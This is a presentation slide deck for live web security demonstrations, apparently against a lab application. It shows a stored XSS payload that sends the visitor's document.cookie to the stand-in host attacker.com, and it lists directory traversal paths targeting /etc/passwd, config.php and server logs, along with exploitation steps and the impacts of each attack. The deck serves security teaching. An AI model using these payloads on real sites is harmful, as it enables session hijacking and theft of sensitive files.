---
layout: section
---

# Live Demonstrations

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

---
layout: default
---

# Stored XSS Attack

<div class="grid grid-cols-2 gap-8">
  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Advanced Payload</h3>

```js
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '<http://attacker.com/?cookie=>' 
            + document.cookie);
  xhr.send();

  document.body.style.backgroundColor = 'red';
  alert('XSS Démonstration');
</script>
```
  </div>

  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Attack Process</h3>
    <div class="space-y-4">
      <p>1. Navigate to "Stored XSS Blog"</p>
      <p>2. Post a normal message first</p>
      <p>3. Submit XSS payload</p>
      <p>4. Observe execution on each visit</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>

---
layout: default
---

# Directory Traversal

<div class="grid grid-cols-2 gap-8">
  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Target Files</h3>

```bash
# System Files
../../../etc/passwd
../../../etc/hosts
../../../etc/hostname

# Application Files
../../../var/www/html/config.php
../../../var/log/apache2/access.log
../../../etc/apache2/apache2.conf
```

  </div>

  <div>
    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Exploitation Steps</h3>
    <div class="space-y-4">
      <p>1. Access "Directory Traversal - Files"</p>
      <p>2. Test normal file access</p>
      <p>3. Use path traversal sequences</p>
      <p>4. Access sensitive files</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>


---
layout: default
---

# Security Impact

<div class="grid grid-cols-2 gap-8">
  <div class="bg-red-50/20 p-6 rounded-lg">
    <h3 class="font-bold mb-4">XSS Impact</h3>
    <div class="space-y-2">
      <p>• Session hijacking</p>
      <p>• Data theft</p>
      <p>• Page defacement</p>
      <p>• Malicious redirects</p>
    </div>
  </div>

  <div class="bg-blue-50/20 p-6 rounded-lg">
    <h3 class="font-bold mb-4">Directory Traversal Impact</h3>
    <div class="space-y-2">
      <p>• Configuration exposure</p>
      <p>• System information leak</p>
      <p>• Sensitive data access</p>
      <p>• Log file disclosure</p>
    </div>
  </div>
</div>

<div class="slide-number">
  <SlideCurrentNo />/<SlideTotalNo />
</div>
